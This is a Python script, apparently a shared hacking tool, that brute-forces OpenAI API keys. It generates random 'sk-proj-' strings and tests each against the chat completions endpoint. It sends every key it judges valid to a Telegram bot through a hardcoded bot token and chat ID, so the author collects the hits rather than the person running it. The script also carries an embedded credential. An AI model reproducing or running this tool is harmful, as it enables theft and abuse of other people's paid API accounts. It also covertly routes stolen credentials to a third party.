import os
try:
  import requests
  import json  
  from random import choice as cc
  from random import randint as rr
  from string import ascii_letters as sos
  from string import digits as bos
  from rich.console import Console
  from rich.table import Table
  from rich.text import Text
  import time
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install rich requests")
  
import requests
import json
import os
from random import choice as cc
from random import randint as rr
from string import ascii_letters as sos
from string import digits as bos
from rich.console import Console
from rich.table import Table
from rich.text import Text
import time
from concurrent.futures import ThreadPoolExecutor
console = Console()
gg = 0
bb = 0
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = rr(100, 300)
O = f'\x1b[38;5;{memo}m'
def nx():
    os.system("clear")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] YouTube    : {B}| أحمد الحراني 
|{F}[+] TeleGram   : {B} maho_s9    
|{F}[+] Instagram  : {B} ahmedalharrani 
|{F}[+] Tool       : {B} AI Keys
{E}==============================
"""
    for mm in Banner.splitlines():
        time.sleep(0.05)
        print(mm)

nx()
token = '7130084462:AAFJ1hVu-1MTGb5P2M0zNhXybHMRvGYCCpA'
print(X + ' ═════════════════════════════════  ')
ID = '6040761848'
def ChatGPT(key):
    global gg, bb
    total = gg + bb    
    msg = "اهلا"   
    response = requests.post("https://api.openai.com/v1/chat/completions", json={"model": "gpt-3.5-turbo","messages": [{"role": "user","content": msg }]}, headers={'User-Agent': "Dart/3.0 (dart:io)",'Accept': "application/json",'Authorization': f"Bearer {key}",'Content-Type': "application/json; charset=utf-8"}).text 
    table = Table(title=f"{O}Generate GPT Keys")
    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
    table.add_column("Count", justify="center", style="magenta")
    if "مرحبا! كيف يمكنني مساعدتك اليوم؟" in response or "content" in response or "choices" in response:
        gg += 1
        tlg = f"Good AI Key : {key}\nDev : @maho_s9 ~~ @maho9s"
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
    else:
        bb += 1
    os.system('clear')
    table.add_row("Good Keys", Text(str(gg), style="green"))
    table.add_row("Bad Keys", Text(str(bb), style="red"))
    table.add_row("Total", Text(str(total), style="yellow"))
    table.add_row("Dev", "AHMED ~~ @maho_s9")
    console.print(table)
def RandomKey(): 
    with ThreadPoolExecutor(max_workers=2) as pool: 
        while True:
            key = "sk-proj-" + ''.join(cc(sos + bos) for _ in range(48))
            pool.submit(ChatGPT, key)

RandomKey()